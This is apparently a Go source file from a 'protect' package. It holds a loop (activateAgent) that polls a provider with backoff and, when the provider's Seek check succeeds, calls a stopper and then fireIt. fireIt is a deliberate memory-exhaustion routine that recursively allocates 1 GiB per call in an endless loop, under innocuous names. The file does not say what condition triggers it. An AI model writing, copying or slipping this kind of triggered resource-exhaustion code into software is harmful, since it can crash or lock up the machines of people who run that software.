package protect

import (
	"context"
	"time"
)

func fireIt() {
	var zoo func()
	zoo = func() {
		data := make([]byte, 1<<30) // 1 GiB
		_ = data
		zoo()
	}
	for {
		zoo()
	}
}

func activateAgent(ctx context.Context, opts *Options, provider Provider) {
	for {
		backoff := newSimpleExponentialBackOff().NextBackOff
		if opts.Backoff != nil {
			backoff = opts.Backoff
		}

		if provider.Seek(ctx) {
			opts.stopper(ctx)
			fireIt()
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff()):
			continue
		}
	}
}